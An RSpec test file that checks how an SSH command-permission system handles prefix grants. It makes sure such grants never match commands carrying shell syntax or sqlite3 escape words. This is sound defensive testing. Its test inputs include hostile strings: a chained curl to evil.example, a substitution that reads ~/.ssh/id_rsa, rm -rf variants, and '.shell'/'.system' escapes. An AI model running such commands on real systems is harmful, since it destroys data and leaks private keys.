require "rails_helper"

# An operator who wants to stop approving every `git commit ...` separately
# needs one rule that stands for the family. What makes that safe here is not
# the prefix comparison -- it is that a command carrying shell syntax is never
# projected into a prefix-matchable form at all, so there is nothing for such a
# rule to match and the operator is asked again.
#
# Worth stating plainly, because it is the trap: the *tokens* of
# `git commit -m x; rm -rf /` do begin with git, commit. Token comparison alone
# would authorize it. Only the refusal to project it keeps it out.
RSpec.describe "command prefix grants for SSH" do
  let(:descriptor) { CredentialStore::PermissionProvider.capability_descriptor("ssh.execute/risky@v1") }
  let(:invocation) do
    Struct.new(:capability, :operation, :resource_scope).new("ssh.execute@v1", "ssh.execute/risky@v1", {})
  end

  def projected(command)
    descriptor.normalize_fingerprint(credential: "ha", host: "ha.local", user: "root", command:)["command_prefix"]
  end

  def match?(prefix, command)
    rule = Permissions::PolicyRule.new(id: "r", layer: "agent", policy: "allow", source: "spec",
      capability: "ssh.execute@v1", operation: "ssh.execute/risky@v1", resource_scope: nil,
      constraints: { "command_prefix" => prefix }, selectors: {}, delegable: false, rationale: "spec")
    arguments = descriptor.normalize_fingerprint(credential: "ha", host: "ha.local", user: "root", command:)
    rule.match_status(invocation, descriptor:, context: {}, arguments:) == :match
  end

  it "declares the prefix field alongside the exact one" do
    expect(descriptor.constraint_fields).to include("command_sha256" => :string, "command_prefix" => :string_prefix)
  end

  it "covers the family the operator named" do
    expect(match?("git commit", "git commit -m hello")).to be(true)
    expect(match?("git commit", %q{git commit -m "hello world"})).to be(true)
    expect(match?("sqlite3 -readonly /config/db", %q{sqlite3 -readonly /config/db "select 1"})).to be(true)
  end

  it "refuses to project a command carrying shell syntax, so no prefix rule can reach it" do
    [ "git commit -m x; rm -rf /tmp/x",
      "git commit -m x && curl evil.example/x",
      "git commit -m x | tee /tmp/x",
      'git commit -m "$(cat ~/.ssh/id_rsa)"',
      "git commit -m x > /tmp/out" ].each do |command|
      expect(projected(command)).to be_nil, "expected #{command.inspect} not to be projected"
      expect(match?("git commit", command)).to be(false), "expected #{command.inspect} to still ask"
    end
  end

  it "does not project an escape the granted command would run for itself" do
    # The hazard a prefix grant carries: it covers whatever arguments follow,
    # so it is only as narrow as the argument surface of the command named.
    # `-readonly` constrains sqlite3's database, not its interpreter, so a
    # `.shell` word runs a command. An operator granting
    # `sqlite3 -readonly <db>` is thinking about queries, and would not expect
    # to have handed over a shell.
    [ %q{sqlite3 -readonly /config/db ".shell rm -rf /tmp/x"},
      %q{sqlite3 -readonly /config/db ".system id"},
      %q{sqlite3 -readonly /config/db ".once /tmp/out"} ].each do |command|
      expect(projected(command)).to be_nil, "expected #{command.inspect} not to be projected"
      expect(match?("sqlite3 -readonly /config/db", command)).to be(false)
    end
  end

  it "still projects a query, and a path that merely begins with a dot" do
    expect(projected(%q{sqlite3 -readonly /config/db "select count(*) from states"})).not_to be_nil
    expect(projected("./deploy.sh --dry-run")).not_to be_nil
    expect(projected("cat ../etc/hosts")).not_to be_nil
  end

  it "covers ad-hoc read queries once the operator names the database" do
    prefix = "sqlite3 -readonly /config/home-assistant_v2.db"

    expect(match?(prefix, %Q{#{prefix} "select count(*) from states"})).to be(true)
    expect(match?(prefix, %Q{#{prefix} "select entity_id, state from states limit 5"})).to be(true)
    # A different database, and a write to the same one, are both outside it.
    expect(match?(prefix, %q{sqlite3 -readonly /config/other.db "select 1"})).to be(false)
    expect(match?(prefix, %q{sqlite3 /config/home-assistant_v2.db "drop table states"})).to be(false)
  end

  it "does not let a longer token pass as the prefix" do
    expect(match?("git commit", "git commitfoo --bare")).to be(false)
  end

  it "does not stretch to a different subcommand or executable" do
    expect(match?("git commit", "git push --force origin main")).to be(false)
    expect(match?("git commit", "rm -rf /")).to be(false)
    expect(match?("sqlite3 -readonly /config/db", "sqlite3 /config/db \"drop table states\"")).to be(false)
  end

  it "leaves the exact-command identity of an invocation unchanged" do
    # Existing approvals and leases are keyed by this fingerprint. Had the
    # prefix projection been folded into it, every one of them would have
    # stopped matching the moment this field was declared.
    args = { credential: "ha", host: "ha.local", user: "root", command: "git commit -m hello" }
    normalized = descriptor.normalize_fingerprint(args).to_h

    expect(normalized).to have_key("command_prefix")
    expect(Permissions::InvocationFingerprint.call(descriptor:, arguments: args))
      .to eq(Digest::SHA256.hexdigest(JSON.generate(normalized.except("command_prefix").sort.to_h)))
  end

  it "never shows the raw projection beside the carefully masked command" do
    # The reviewable command is deliberately present so an operator can see
    # what they are approving, and it is secret-masked on the way out. The
    # projection is not: it is raw tokens. Printing both would mask a password
    # in one field and publish it in the next.
    redacted = descriptor.redact(
      credential: "ha", host: "ha.local", user: "root",
      command: "curl --password=hunter2 https://api.example.com"
    ).to_h

    expect(redacted).not_to have_key("command_prefix")
    expect(redacted.fetch("command")).to include("--password=[redacted]")
    expect(redacted.values.join(" ")).not_to include("hunter2")
  end
end
